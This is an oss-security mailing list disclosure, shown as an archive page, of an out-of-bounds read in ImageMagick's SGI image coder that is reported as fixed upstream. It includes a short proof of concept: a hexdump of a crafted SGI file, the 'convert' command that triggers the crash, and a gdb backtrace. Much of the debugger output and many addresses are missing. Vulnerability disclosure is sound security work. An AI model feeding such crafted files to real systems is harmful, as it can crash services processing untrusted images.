  oss-security - - ImageMagick SGI Coder Out-Of-Bounds Read  Vulnerability            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Mon, 26 Sep From: pwchen(陈佩文) <pwchen@...cent.com> To: oss-security <oss-security@...ts.openwall.com> Subject: - ImageMagick SGI Coder Out-Of-Bounds Read  Vulnerability  Hi.  This is PeiwenChen of Tencent's Xuanwu Lab & RayZhong of Tencent's Keen Lab. During our research, we found an Out-Of-Bounds write vulnerability in  ImageMagick's SGI coder.  When ImageMagick is identifying SGI format image, we can craft a sgi file with big value of row. It will read a certain number of times which is controllable by value of row, It cause an Out-Of-Bounds Read.  The ImageMagick team has fixed the vulnerability we reported.   Upstream fix:  Debian Bug report:   Attached is a proof of concept and backtrace.  $ hexdump PoC.sgi da01 fffe  $ convert PoC.sgi   Program received signal SIGSEGV, Segmentation fault. [------------------------registers------------------------] RAX: 0x0 RBX: 0x1 RCX: RDX: --> 0x0 RSI: --> 0x1 RDI: --> 0x1 RBP: 0xdfbc RSP: --> RIP: movss  xmm0,DWORD PTR R8 : --> 0x0 R9 : 0x1 R10: --> 0x0 R11: 0x1 R12: --> R13: --> R14: --> --> 0x0  R15:                          <== end address of heap  [---------------------------code---------------------------]    inc    BYTE PTR [rdx+rcx*1]    mov    DWORD PTR    mov    rax,QWORD PTR => movss  xmm0,DWORD PTR    movaps XMMWORD PTR    mov    rax,QWORD PTR    movss  xmm4,DWORD PTR    subss  xmm0,xmm4 [---------------------------stack---------------------------] rsp -->     --> 0x0     --> --> -->     --> -->     --> 0x0     --> 0x1     --> 0x0     --> 0xfeff [-----------------------------------------------------------] Legend: stack, code, data, heap, rodata, value Stopped reason: SIGSEGV in IsPixelMonochrome (image=<optimized out>, pixel=<optimized out>) at   red_green=(MagickRealType) pixel[image->channel_map[RedPixelChannel].offset]-  gdb-peda$ bt #0  in IsPixelMonochrome (image=<optimized out>, pixel=<optimized out>) at #1  IdentifyImageGray (image=<optimized out>, exception=<optimized out>) at #2  in IdentifyImageType at #3  in IdentifyImage file=<optimized out>, verbose=<optimized out>, at #4  in IdentifyImageCommand (image_info=<optimized out>, argc=<optimized out>, argv=<optimized out>, metadata=<optimized out>, exception=<optimized out>) at #5  in MagickCommandGenesis (image_info=<optimized out>, command=<optimized out>, argc=<optimized out>, argv=<optimized out>, metadata=<optimized out>, exception=<optimized out>) at #6  in MagickMain (argc=<optimized out>, argv=<optimized out>) at #7  main (argc=<optimized out>, argv=<optimized out>, at #8  in __libc_start_main <main>, argc=0x2, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, at #9  in _start ()   gdb-peda$ vmmap Start              End                Perm Name                 r-xp /usr/local/bin/magick                 r--p /usr/local/bin/magick                 rw-p /usr/local/bin/magick                 rw-p [heap] r--p /usr/lib/locale/locale-archive   Regards, Peiwen Chen Tencent's Xuanwu Lab   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      